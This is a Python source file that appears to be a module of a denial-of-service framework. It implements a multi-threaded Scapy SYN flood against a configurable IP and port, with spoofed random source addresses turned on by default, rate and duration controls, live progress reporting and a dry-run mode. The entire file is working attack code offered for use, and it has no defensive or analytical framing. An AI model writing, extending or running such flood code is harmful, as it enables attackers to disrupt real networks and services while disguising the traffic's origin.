#!/usr/bin/env python3
"""
DoS Master Framework - SYN Flood Attack Module - FIXED VERSION
Professional SYN flood implementation using Scapy with thread-safe counting
"""

import threading
import time
import socket
import random
import os
from typing import Dict, Any
from datetime import datetime

try:
    from scapy.all import IP, TCP, send, RandShort
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

class SYNFlood:
    """SYN flood attack implementation"""
    
    def __init__(self, config: Dict, logger):
        self.config = config
        self.logger = logger
        self.target = config['target']
        self.port = config.get('port', 80)
        self.duration = config.get('duration', 60)
        self.threads = config.get('threads', 8)
        self.rate_limit = config.get('rate', 0)
        self.spoof_ips = config.get('spoof_ips', True)
        self.dry_run = config.get('dry_run', False)
        
        self.packets_sent = 0
        self.packets_failed = 0
        self.attack_active = False
        self.start_time = None
        self.worker_threads = []
        self.packet_lock = threading.Lock()  # Thread-safe counter
        
    def validate_config(self) -> bool:
        """Validate attack configuration"""
        if not SCAPY_AVAILABLE:
            self.logger.error("Scapy library not available. Install with: pip install scapy")
            return False
            
        try:
            # Validate target IP
            socket.inet_aton(self.target)
            
            # Validate port
            if not (1 <= self.port <= 65535):
                self.logger.error("Port must be between 1 and 65535")
                return False
                
            # Validate duration
            if self.duration <= 0 or self.duration > 3600:
                self.logger.error("Duration must be between 1 and 3600 seconds")
                return False
                
            # Validate threads
            if self.threads <= 0 or self.threads > 50:
                self.logger.error("Threads must be between 1 and 50")
                return False
            
            return True
            
        except socket.error:
            self.logger.error(f"Invalid target IP address: {self.target}")
            return False
    
    def execute(self) -> Dict[str, Any]:
        """Execute SYN flood attack"""
        self.logger.info(f"Starting SYN flood attack against {self.target}:{self.port}")
        
        if self.dry_run:
            return self._simulate_attack()
        
        self.attack_active = True
        self.start_time = time.time()
        
        try:
            # Start worker threads
            for i in range(self.threads):
                thread = threading.Thread(target=self._syn_worker, args=(i,))
                thread.daemon = True
                thread.start()
                self.worker_threads.append(thread)
                time.sleep(0.1)  # Stagger thread starts
            
            # Monitor attack progress
            self._monitor_attack()
            
            # Wait for all threads to complete
            for thread in self.worker_threads:
                thread.join(timeout=2)
            
            # Calculate results
            end_time = time.time()
            actual_duration = end_time - self.start_time
            avg_rate = self.packets_sent / actual_duration if actual_duration > 0 else 0
            
            result = {
                'attack_type': 'syn_flood',
                'target': f"{self.target}:{self.port}",
                'duration': actual_duration,
                'packets_sent': self.packets_sent,
                'packets_failed': self.packets_failed,
                'success_rate': (self.packets_sent / (self.packets_sent + self.packets_failed)) * 100 if (self.packets_sent + self.packets_failed) > 0 else 0,
                'avg_rate': avg_rate,
                'threads_used': self.threads,
                'spoof_enabled': self.spoof_ips,
                'timestamp': datetime.now().isoformat()
            }
            
            self.logger.info(f"SYN flood completed: {self.packets_sent} packets sent")
            return result
            
        except Exception as e:
            self.logger.error(f"SYN flood attack failed: {e}")
            raise
        finally:
            self.attack_active = False
    
    def _syn_worker(self, worker_id: int):
        """SYN flood worker thread"""
        self.logger.debug(f"SYN worker {worker_id} started")
        
        local_packets_sent = 0
        local_packets_failed = 0
        
        try:
            while self.attack_active and (time.time() - self.start_time) < self.duration:
                try:
                    # Generate source IP (spoofed or real)
                    if self.spoof_ips:
                        src_ip = self._generate_random_ip()
                    else:
                        src_ip = None  # Use real IP
                    
                    # Generate random source port
                    src_port = random.randint(1024, 65535)
                    
                    # Create SYN packet
                    if src_ip:
                        packet = IP(src=src_ip, dst=self.target) / \
                                TCP(sport=src_port, dport=self.port, 
                                    flags="S", seq=RandShort())
                    else:
                        packet = IP(dst=self.target) / \
                                TCP(sport=src_port, dport=self.port, 
                                    flags="S", seq=RandShort())
                    
                    # Send packet
                    send(packet, verbose=0)
                    local_packets_sent += 1
                    
                    # Rate limiting
                    if self.rate_limit > 0:
                        delay = self.threads / self.rate_limit
                        time.sleep(delay)
                    
                    # Update global counter every 50 packets for better performance
                    if local_packets_sent % 50 == 0:
                        with self.packet_lock:
                            self.packets_sent += 50
                        local_packets_sent = 0
                        
                except Exception as e:
                    local_packets_failed += 1
                    if local_packets_failed % 50 == 0:
                        self.logger.debug(f"Worker {worker_id}: {local_packets_failed} failed packets")
                        with self.packet_lock:
                            self.packets_failed += 50
                        local_packets_failed = 0
            
            # Final update for remaining packets
            with self.packet_lock:
                self.packets_sent += local_packets_sent
                self.packets_failed += local_packets_failed
                
        except Exception as e:
            self.logger.error(f"SYN worker {worker_id} failed: {e}")
            with self.packet_lock:
                self.packets_failed += 1
            
        self.logger.debug(f"SYN worker {worker_id} completed")
    
    def _generate_random_ip(self) -> str:
        """Generate random IP address for spoofing"""
        # Generate random IP (avoid reserved ranges)
        while True:
            ip = f"{random.randint(1, 223)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
            
            # Avoid reserved ranges but allow private IPs for lab testing
            first_octet = int(ip.split('.')[0])
            if first_octet not in [0, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255]:
                return ip
    
    def _monitor_attack(self):
        """Monitor attack progress"""
        while self.attack_active:
            elapsed = time.time() - self.start_time if self.start_time else 0
            remaining = max(0, self.duration - elapsed)
            
            if elapsed > 0:
                current_rate = self.packets_sent / elapsed
                self.logger.info(f"SYN flood progress: {elapsed:.1f}s elapsed, "
                               f"{self.packets_sent} packets sent, "
                               f"{current_rate:.1f} pps, "
                               f"{remaining:.1f}s remaining")
            
            if remaining <= 0:
                self.attack_active = False
                break
                
            time.sleep(5)
    
    def _simulate_attack(self) -> Dict[str, Any]:
        """Simulate attack for dry-run mode"""
        self.logger.info("Simulating SYN flood attack (dry-run mode)")
        
        # Simulate attack metrics
        estimated_packets = self.threads * 500 * self.duration  # Conservative estimate
        
        time.sleep(2)  # Brief simulation delay
        
        return {
            'attack_type': 'syn_flood',
            'target': f"{self.target}:{self.port}",
            'duration': self.duration,
            'packets_sent': estimated_packets,
            'packets_failed': 0,
            'success_rate': 100.0,
            'avg_rate': estimated_packets / self.duration,
            'threads_used': self.threads,
            'spoof_enabled': self.spoof_ips,
            'timestamp': datetime.now().isoformat(),
            'dry_run': True
        }
    
    def stop(self):
        """Stop the attack"""
        self.logger.info("Stopping SYN flood attack")
        self.attack_active = False
    
    def get_status(self) -> Dict[str, Any]:
        """Get current attack status"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        current_rate = self.packets_sent / elapsed if elapsed > 0 else 0
        
        return {
            'attack_type': 'syn_flood',
            'active': self.attack_active,
            'elapsed_time': elapsed,
            'packets_sent': self.packets_sent,
            'current_rate': current_rate,
            'threads_active': len([t for t in self.worker_threads if t.is_alive()])
        }